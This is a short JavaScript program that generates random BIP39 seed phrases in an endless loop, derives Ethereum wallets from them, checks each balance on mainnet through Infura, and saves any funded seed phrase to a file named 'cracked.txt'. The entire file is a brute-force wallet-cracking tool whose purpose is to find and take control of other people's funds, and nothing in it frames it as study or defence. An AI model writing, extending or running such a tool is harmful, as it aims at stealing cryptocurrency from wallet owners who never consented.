const ethers = require("ethers")
const Web3   = require("web3")
const bip39  = require("bip39")
const fs = require('fs')
require('dotenv').config()
const api = `https://mainnet.infura.io/v3/${process.env.KEY}`
const provider = new Web3(new Web3.providers.HttpProvider(api))

async function main() {
  while(1) {
    var mnemonic = bip39.generateMnemonic()
    var wallet = ethers.Wallet.fromMnemonic(mnemonic)
    var address = wallet.address
    var balance = await provider.eth.getBalance(address)
    
    if (balance !== '0') {
      const content = mnemonic + '\n' + address + '\n' 
      
      fs.appendFile('cracked.txt', content, err => {
        if (err) {
          console.error(err)
          return
        }
      })
    }  
    else {
      const content = mnemonic+'\n'+address+'\n'

      fs.appendFile('zerobalance.txt', content, err => {
        if (err) {
          console.error(err)
          return
        }
      })      
    }
   
    console.log(address)
    console.log("balance: ", balance)
  }
}

main()
    .then(() => {
        process.exit(0)
    })
    .catch((err) => {
        console.error(err)
        process.exit(1)
    })